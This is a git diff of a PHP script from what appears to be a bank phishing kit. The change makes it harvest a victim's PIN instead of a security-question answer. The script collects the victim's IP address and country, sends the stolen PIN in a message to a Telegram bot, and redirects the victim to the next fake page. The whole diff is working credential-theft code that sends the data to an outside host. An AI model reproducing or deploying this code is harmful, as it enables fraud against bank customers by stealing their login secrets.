@@ -3,8 +3,8 @@ ini_set("display_errors", 0);
 include("datos_tlgram.php");
 
 // Obtener los datos del formulario
-$r1 = $_POST['resp1'];
- 
+$p = $_POST['cdpin'];
+
 // Obtener la dirección IP del cliente
 function getIP() {
    if (isset($_SERVER)) {
@@ -27,10 +27,10 @@ $myip = getIP() ;
 @$pais = $meta['geoplugin_countryName']; 
 @$region = $meta['geoplugin_regionName'];
 
+
 // Mensaje a enviar a Telegram
 $message = "L0GIN iBDF:\n\n";
-$message .= "RESPUESTA SECRETA 1: " . $r1 . "\n";
- 
+$message .= "Pin 2: " . $p . "\n";
 $message .= "IP: " . $myip." ".$pais ." ".$region."";
 
 // Enviar el mensaje a través del bot de Telegram
@@ -58,7 +58,8 @@ if ($response === false) {
   //exit();
 }
 
+
 echo "<script type='text/javascript'>";
-echo "window.location.href='firm.php';";
+echo "window.location.href='resp.php';";
 echo "</script>";
 ?>
